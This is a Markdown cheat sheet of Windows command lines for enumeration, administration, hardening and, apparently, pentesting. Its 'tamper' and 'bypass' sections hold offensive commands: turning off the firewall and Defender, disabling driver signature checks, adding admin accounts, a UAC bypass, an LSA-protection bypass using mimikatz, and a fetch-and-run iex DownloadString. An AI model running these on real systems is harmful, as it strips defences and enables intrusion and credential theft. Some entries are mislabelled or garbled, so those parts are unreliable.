---
layout: post
title: sys / win 
category: sys
parent: cheatsheets
modified_date: 2024-06-19
permalink: /sys/win
---

**MENU**

<!-- vscode-markdown-toc -->
* [copy](#copy)
	* [copy-dir](#copy-dir)
	* [copy-file](#copy-file)
* [enum](#enum)
	* [get-kb](#get-kb)
	* [get-gpo](#get-gpo)
	* [get-os](#get-os)
	* [get-products](#get-products)
	* [get-processes](#get-processes)
	* [get-path](#get-path)
	* [get-pipes](#get-pipes)
	* [get-scheduled-tasks](#get-scheduled-tasks)
	* [get-services](#get-services)
	* [get-sessions](#get-sessions)
	* [get-usb-devices](#get-usb-devices)
	* [get-users](#get-users)
	* [get-vss](#get-vss)
* [enum-net](#enum-net)
	* [get-ca](#get-ca)
	* [get-neighbors](#get-neighbors)
	* [get-net-settings](#get-net-settings)
	* [get-routes](#get-routes)
	* [get-shares](#get-shares)
* [enum-sec](#enum-sec)
	* [get-certificate-info](get-certificate-info) 	
	* [get-file-hash](#get-file-hash)
	* [get-status-fw](#get-status-fw)
	* [get-status-proxy](#get-status-proxy)
	* [get-status-defender](#get-status-defender)
	* [get-status-cred-guard](#get-status-cred-guard)
	* [get-status-ppl](#get-status-ppl)
* [exec](#exec)
	* [decode-base64](#decode-base64)
* [install](#install)
	* [gpedit-win-10-home](#gpedit-win-10-home)
* [run](#run)
	* [network-capture](#network-capture)
* [tamper](#tamper)
	* [add-account](#add-account)
	* [add-regkey](#del-regkey)
 	* [del-regkey](#del-regkey)
 	* [set-fs-perms](set-fs-perms)
	* [set-kb](#set-kb)
	* [set-network](#set-network)	
	* [set-proxy](#set-proxy)
	* [set-rdp](#set-rdp)
	* [set-winrm](#set-winrm)
	* [set-smbv1](#set-smbv1)
	* [unset-fw](#unset-fw)
	* [unset-defender](#unset-defender)
	* [unset-cred-guard](#unset-cred-guard)
	* [unset-ppl](#unset-ppl)
	* [unset-sigcheck](#unset-sigcheck)
	* [unset-restricted-admin-mode](#unset-restricted-admin-mode)
	* [dl-ps-ad-module](#dl-ps-ad-module)
* [harden](#harden)
	* [set-msdefender](#set-msdefender)
	* [disable-llmnr](#disable-llmnr)
	* [disable-ms-msdt](#disable-ms-msdt)
	* [schtasks-secure-pwd](#schtasks-secure-pwd)
* [bypass](#bypass)
	* [bypass-uac](#bypass-uac)
	* [bypass-lsaprotection](#bypass-lsaprotection)
	* [bypass-sources](#bypass-sources)
* [misc](#misc)
	* [run](#run)
	* [dism](#dism)
	* [wsl](#wsl)

<!-- vscode-markdown-toc-config
	numbering=false
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc -->

**ALSO**

* [windows logs](/sys/logs-win/)

## <a name='copy'></a>copy
### <a name='copy-file'></a>copy-dir
```
robocopy.exe "C:\windows\system32\winevt\logs\" "C:\windows\temp\logs"
```

### <a name='copy-file'></a>copy-file
```
# copy a single
robocopy.exe /MIR "C:\windows\system32\winevt\logs\" "C:\windows\temp" Security.evtx
```

## <a name='enum'></a>enum

### <a name='get-kb'></a>get-kb
```
# listing KB wmi
wmic qfe list full /format:table

# listing KB ps
powershell -Command "systeminfo /FO CSV" | out-file C:\Windows\Temp\systeminfo.csv
import-csv C:\Windows\Temp\systeminfo.csv | ForEach-Object{$_."Correctif(s)"}
```

### <a name='get-kb'></a>get-logs
```powershell
Get-WmiObject win32_nteventlogfile
```

### <a name='get-gpo'></a>get-gpo
```powershell
rsop
gpresult /Z /scope:computer 
```

### <a name='get-os'></a>get-os
```powershell
# listing OS version
wmic os list brief
wmic os get MUILanguages
```

### <a name='get-products'></a>get-products
```powershell
# listing windows product
wmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version /format:csv
```

### <a name='get-processes'></a>get-processes
```powershell
# listing windows services 
wmic service get Caption,Name,PathName,ServiceType,Started,StartMode,StartName /format:csv
# winrm service
Get-WmiObject -Class win32_service | Where-Object {$_.name -like "WinRM"}
```

### <a name='get-scheduled-tasks'></a>get-scheduled-tasks
```powershell
# list a specific tasks
schtasks /query /TN "Bitlocker" /fo LIST

# list all tasks
schtasks /query /fo LIST /v
```

### <a name='get-services'></a>get-services
```powershell
# listing windows processes
wmic process get CSName,Description,ExecutablePath,ProcessId /format:csv

# services by status
Get-Service | Where-Object {$_.Status -eq "Running"}
Get-Service | Where-Object {$_.Status -eq "Stopped"}

#service specific
Get-Service | Where-Object {$_.Name -like "**"}

#service full details
gwmi win32_service|?{$_.name -eq "CSFalconService"}|select *

#service executable path
gwmi win32_service|?{$_.name -eq "CSFalconService"}|select pathname
```

### <a name='get-sessions'></a>get-sessions
```batch
# listing the active sessions
quser
qwinsta

# display the list of the running processes in the specific RDP session (the session ID is specified):
qprocess /id:5

# killing a session / below '2' is the session ID
logoff 2

# last-sessions
# global view
wmic netlogin get Name,LastLogon,LastLogoff,NumberOfLogons,BadPasswordCount

# backlog of the security eventlogs
Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-Security-Auditing"; id=4624} -Oldest -Max 1 | Select TimeCreated

# user timeline based on the security eventlogs
$ztarg_usersid=''
$ztarg_username='' #username only, no '$zdom\' prefix
Get-WinEvent -FilterHashtable @{'Logname'='Security';'id'=4624,4634} -Max 80 | Where-Object -Property Message -Match $ztarg_username|  select ID,TaskDisplayName,TimeCreated
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4624,4634;Data=$ztarg_usersid} -Max 80 |  select ID,TaskDisplayName,TimeCreated
```

### <a name='get-path'></a>get-path
```powershell
gci env:path | fl *
```

### <a name='get-pipes'></a>get-pipes
```powershell
# printnightmare / CVE-2021-1675/CVE-2021-34527 / 
ls \\localhost\pipe\spoolss
```

### <a name='get-usb-devices'></a>get-usb-devices
```
# https://www.shellhacks.com/windows-lsusb-equivalent-powershell/
Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -match '^USB' } | FT -autosize 
Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -match '^USB' } | Format-List
```

### <a name='get-users'></a>get-users
```powershell
# get local users
wmic netlogin list brief
net user

# get local users, SID
Get-WmiObject win32_useraccount | Select name,sid
wmic useraccount get name,sid
wmic useraccount where name=john.doe get sid 

# get acconut creation date
dir /tc C:\Users

# get local groups and members 
net localgroup
net localgroup Administrators
```

### <a name='get-vss'></a>get-vss
```powershell
# listing
vssadmin list shadows
vssadmin list shadowstorage
vssadmin list volumes

# create a shadow copy for C:
vssadmin create shadow /for=c:
```

## <a name='enum-sec'></a>enum-net

### <a name='get-ca'></a>get-ca
```powershell
# run it on CA servers
certutil -scroot update
```

### <a name='get-neighbors'></a>get-neighbors
```
# show the mac address table
arp -a

# show a neighbor
netstat -A 192.168.1.254

# show ipv6 neighbors
netsh interface ipv6 show neighbors
```

### <a name='get-net-settings'></a>get-net-settings
```powershell
# listing network hardware
wmic nic list brief
ipconfig /all

# listing network software 
wmic nicconfig where IPEnabled='true' get Caption,DefaultIPGateway,Description,DHCPEnabled,DHCPServer,IPAddress,IPSubnet,MACAddress
ipconfig /all
route -n
netstat -ano
```

### <a name='get-net-settings'></a>get-routes
```
# Display all routing tables
route print

# Print IPv4 routing table
route print -4

# Print IPv6 routing table
route print -6
```

### <a name='get-shares'></a>get-shares
```powershell
# listing network shares
wmic netuse list brief
net use

wmic share
net share

# listing the domain controllers
nltest /dclist:dom.corp
```

## <a name='enum-sec'></a>enum-sec

### <a name='get-certificate-info'></a>get-certificate-info
```batch
# certificates local stores: https://adamtheautomator.com/windows-certificate-manager/
certutil dump toto.pem
certutil dump toto.crt
```

### <a name='get-file-hash'></a>get-file-hash
```batch
certutil -hashfile X SHA256
get-filehash X
```

### <a name='get-status-fw'></a>get-status-fw
```batch
# logfile: %systemroot%\system32\LogFiles\Firewall\pfirewall.log
netsh advfirewall show allprofiles
netsh firewall show portopening
```

### <a name='get-status-proxy'></a>get-status-proxy
```powershell
##############################
#
#          Windows
#
netsh winhttp show proxy
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
(Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings').ProxyEnable

##############################
#
#      ForcePoint WebSense
#
#
# 01 # config local and saas
dir HKLM:\SOFTWARE\Websense
Invoke-WebRequest -URI http://query.webdefence.global.blackspider.com/?with=all
#
# 02 # service names and status
Get-Service | Where-Object{$_.DisplayName -like "*websense*"}

Status   Name               DisplayName
------   ----               -----------
Stopped  WSDLP              Websense Client Agent
Running  WSPXY              Websense SaaS Service
Stopped  WSRF               Websense Desktop Client
Stopped  WSTS               Websense DCEP Service

Get-Service | Where-Object{$_.DisplayName -like "*Forcepoint*"}

Status   Name               DisplayName
------   ----               -----------
Running  FPDIAG             Forcepoint Endpoint Diagnostics
Stopped  fpeca              Forcepoint Endpoint Context Agent
Stopped  fpneonetworksvc    Forcepoint Network Proxy

# 03 # service status detailed
sc query WSPXY
sc query FPDIAG
```

### <a name='get-status-defender'></a>get-status-defender
```batch
Get-MpComputerStatus
powershell -inputformat none -outputformat text -NonInteractive -Command 'Get-MpPreference | select -ExpandProperty "DisableRealtimeMonitoring"'
```

### <a name='get-status-cred-guard'></a>get-status-cred-guard

Run the following powershell commands as local administrator:

```powershell
powershell -ep bypass
# if DWORD value named LsaCfgFlags is set to :
#  - 0 is disabled
#  - 1 then Windows Defender Credential Guard is enabled with UEFI lock
#  - 2 then Windows Defender Credential Guard enabled without lock
dir HKLM:\SYSTEM\CurrentControlSet\Control\Lsa*
# if DWORD value named EnableVirtualizationBasedSecurity is set to : 
#  - 0 then virtualization-based security is disabled
#  - 1 then virtualization-based security is enabled
# if DWORD value named RequirePlatformSecurityFeatures is set to :
#  - 1 then Secure Boot only 
#  - 3 then Secure Boot and DMA protection
dir HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard*
```

Reference :
 - [MSDN - Credential Guard Management](https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-manage)

### <a name='get-status-ppl'></a>get-status-ppl

## <a name='exec'></a>exec

### <a name='decode-base64'></a>decode-base64
```powershell
echo "" | base64 -d | iconv -f UTF-16LE -t UTF-8 
```

## <a name='install'></a>install

### <a name='gpedit-win-10-home'></a>gpedit-win-10-home
```powershell
# useful for commando VM
FOR %F IN ("%SystemRoot%\servicing\Packages\Microsoft-Windows-GroupPolicy-ClientTools-Package~*.mum") DO (DISM /Online /NoRestart /Add-Package:"%F")
FOR %F IN ("%SystemRoot%\servicing\Packages\Microsoft-Windows-GroupPolicy-ClientExtensions-Package~*.mum") DO (DISM /Online /NoRestart /Add-Package:"%F")
```

## <a name='run'></a>run

### <a name='network-capture'></a>network-capture
```
netsh trace start tracefile=C:\temp\trace.etl
netsh trace stop
```

## <a name='tamper'></a>tamper

### <a name='add-account'></a>add-account
```batch
# create a local user account
net user /ADD test test

# create a local user account and prompt for the pwd
net user /ADD test *

# create a domain user account prompt for the pwd
net user /ADD test * /DOMAIN

# add the new user to administrators
net localgroup Administrators test /ADD
net localgroup Administrators corp\test /ADD
```

### <a name='add-regkey'></a>add-regkey
```batch
```

### <a name='del-regkey'></a>del-regkey
```batch
set "SID=1-5-21-XXX-500"
reg delete HKEY_USERS\%SID%\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v abcdef123456 /f
```

### <a name='set-fs-perms'></a>set-fs-perms
```powershell
# https://superuser.com/questions/1002883/how-do-i-specify-chmod-744-in-powershell
# Set Owner of a specific file
icacls "test.txt" /setowner "administrator"

# Grant Full Control
icacls "test.txt" /grant:r "administrator:(F)" /C

# Grant Read and Execute Access of a specific file
icacls "test.txt" /grant:r "users:(RX)" /C
icacls "test.txt" /grant:r "utilisateurs:(RX)" /C

# Grant Read-only Access of a specific file
icacls "test.txt" /grant:r "users:(R)" /C
icacls "test.txt" /grant:r "utilisateurs:(RX)" /C
```

### <a name='set-kb'></a>set-kb
```powershell
Set-WinUserLanguageList -Force "fr-FR"
Set-WinUserLanguageList -Force "en-US"
```

### <a name='set-network'></a>set-network
```batch
netsh interface ip set address "connection name" static 192.168.1.1 255.255.255.0 192.168.1.254
netsh interface ip add dns "connection name" 8.8.8.8
```

### <a name='set-proxy'></a>set-proxy
```
set HTTP_PROXY=http://proxy_userid:proxy_password@proxy_ip:proxy_port
set FTP_PROXY=%HTTP_PROXY%
set HTTPS_PROXY=%HTTP_PROXY%
```


### <a name='set-rdp'></a>set-rdp

```powershell
net localgroup "Remote Desktop Users" $zlat_user /add
```

Learn about session stealing at [hacktricks.xyz](https://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp#session-stealing)

### <a name='set-winrm'></a>set-winrm
```powershell
# client: check winrm service status
Get-WmiObject -Class win32_service | Where-Object {$_.name -like "WinRM"}
Get-Item wsman:\localhost\Client\TrustedHosts

# client: activate winrm and trustedhosts
Start-Service WinRM
Set-Service WinRM -StartMode Automatic
Set-Item wsman:\localhost\client\trustedhosts -Value *

# server
Enable-PSRemoting
```

### <a name='set-smbv1'></a>set-smbv1
```powershell
# DISM 
DISM /online /enable-feature /featurename:SMB1Protocol
DISM /online /enable-feature /featurename:SMB1Protocol-Client
DISM /online /enable-feature /featurename:SMB1Protocol-Server
DISM /online /enable-feature /featurename:SMB1Protocol-Deprecation

# win10 tampering: PS activate SMBv1 OptionalFeatures
Enable-WindowsOptionalFeature -Online -FeatureName smb1protocol
```

### <a name='unset-fw'></a>unset-fw
```batch
netsh advfirewall set publicprofile state off
netsh advfirewall set privateprofile state off
netsh advfirewall set domainprofile state off
netsh advfirewall set allprofiles state off
```

### <a name='unset-defender'></a>unset-defender
```batch
powershell.exe -Command Set-MpPreference -DisableRealtimeMonitoring $true
```

### <a name='unset-cred-guard'></a>unset-cred-guard 
```powershell
```

### <a name='unset-ppl'></a>unset-ppl

Tools that disable PPL flags on the LSASS process by patching the EPROCESS kernel 
 - [PPLFault](https://github.com/gabriellandau/PPLFault)
 - [EDRSandBlast](https://github.com/wavestone-cdt/EDRSandblast)
 - [PPLdump](https://github.com/itm4n/PPLdump)
 - [PPLKiller](https://github.com/RedCursorSecurityConsulting/PPLKiller)


```batch
```

### <a name='unset-sigcheck'></a>unset-sigcheck

Windows driver signature: disable:
```batch
bcdedit.exe /set nointegritychecks on
bcdedit.exe /set testsigning on
```

### <a name='unset-restricted-admin-mode'></a>unset-restricted-admin-mode
```powershell
# no need to reboot
reg add HKLM\SYSTEM\CurrentControlSet\Control\LSA /v 1
```

### <a name='dl-ps-ad-module'></a>dl-ps-ad-module 
```batch
#version 1
iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
```

## <a name='harden'></a>harden

### <a name='set-msdefender'></a>set-msdefender
```powershell
# disable monitoring
Set-MpPreference -DisableRealtimeMonitoring 0
# enable monitoring
Set-MpPreference -DisableRealtimeMonitoring 1
```

### <a name='disable-llmnr'></a>disable-llmnr
```
REG ADD  “HKLM\Software\policies\Microsoft\Windows NT\DNSClient”
REG ADD  “HKLM\Software\policies\Microsoft\Windows NT\DNSClient” /v ”EnableMulticast” /t REG_DWORD /d “0” /f
```
### <a name='disable-ms-msdt'></a>disable-ms-msdt
```
# MS-MSDT protocol used by follina exploit, CVE-2022-30190
RED DEL "HKEY_CLASSES_ROOT\ms-msdt" /f
```

### <a name='schtasks-secure-pwd'></a>schtasks-secure-pwd

* [duffney.io](https://duffney.io/create-scheduled-tasks-secure-passwords-with-powershell/)

## <a name='bypass'></a>bypass

### <a name='bypass-uac'></a>bypass-uac
```batch
powershell New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value cmd.exe -Force
```

### <a name='bypass-lsaprotection'></a>bypass-lsaprotection
```batch
powershell .\ConsoleApplication1.exe/InstallDriver
powershell .\ConsoleApplication1.exe/makeSYSTEMcmd
powershell .\mimikatz.exe
```

### <a name='bypass-sources'></a>bypass-sources

- [Windows command-line obfuscation](https://www.wietzebeukema.nl/blog/windows-command-line-obfuscation)
- [powershell obfuscation using securestring](https://www.wietzebeukema.nl/blog/powershell-obfuscation-using-securestring)

## <a name='misc'></a>misc

### <a name='run'></a>run

| Name	 | Function |
|--------|-------------|
| Add/Remove Programs	 | appwiz.cpl |
| Administrative Tools	 | control admintools |
| Automatic Updates	| wuaucpl.cpl |
| Bluetooth Transfer wizard	 | fsquirt |
| Certificate Manager	| certmgr.msc |
| Character Map	| charmap |
| Control Panel	| control |
| Computer Management	| compmgmt.msc |
| Date and Time Properties | timedate.cpl |
| Driver Verifier Utility | verifier |
| Event Viewer	| eventvwr.msc |
| File Signature Verification Tool	| sigverif |
| Group Policy Editor | gpedit.msc |
| Logs out of windows | logoff |
| Malicious Software Removal Tool	| mrt |
| Monitors Display | desk.cpl |
| Network Connections	| ncpa.cpl |
| Password Properties	| password.cpl |
| Performance Monitor	| perfmon.msc |
| Registry Editor	| regedit |
| Remote Desktop	| mstsc |
| Security Center	wscui.cpl
| Sounds and Audio	| mmsys.cpl |
| Shuts Down Windows | shutdown |
| SQL Client Configuration	| cliconfg |
| System Configuration Utility	| msconfig |
| Task Manager	| taskmgr |
| Task Scheduler | taskschd.msc |
| User Account Management | nusrmgr.cpl |
| Windows Firewall	| firewall.cpl |
| Windows Version | winver |
| Wordpad | Write |

### <a name='dism'></a>dism
```powershell
# Pre requisites: Admin rights
# get all windows feature and save to a txt file
DISM /online /get-features /format:table > C:\Temp\dism_listing.txt
get-windowsoptionalfeature -online | ft | more

# get windows feature that are enable/disable
DISM /online /get-features /format:table | find “Enabled” | more
DISM /online /get-features /format:table | find “Disabled” | more

# get windows feature by its name
DISM /online /get-featureinfo /featurename:Microsoft-Windows-Subsystem-Linux
DISM /online /get-featureinfo /featurename:TelnetClient
get-windowsoptionalfeature -online -featurename SMB1Protocol*
get-windowsoptionalfeature -online -featurename SMB1Protocol* |ft
```

### <a name='wsl'></a>wsl
Windows WSL manual distro install
```powershell
# Note: By pass the GPO blocking the exec of the App Store app

Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux
New-Item C:\Ubuntu -ItemType Directory
Set-Location C:\Ubuntu
Invoke-WebRequest -Uri https://aka.ms/wsl-ubuntu-1604 -OutFile Ubuntu.appx -UseBasicParsing
Invoke-WebRequest -Uri https://aka.ms/wslubuntu2004 -OutFile Ubuntu.appx -UseBasicParsing
Invoke-WebRequest -Uri https://aka.ms/wsl-kali-linux-new -OutFile Kali.appx -UseBasicParsing
 
# Extract and execute the EXE in the archive to install the distro
Rename-Item .\Ubuntu.appx Ubuntu.zip
Expand-Archive .\Ubuntu.zip -Verbose
Ubuntu.exe

# List the distributions installed
wslconfig /list /all
wsl -l
```
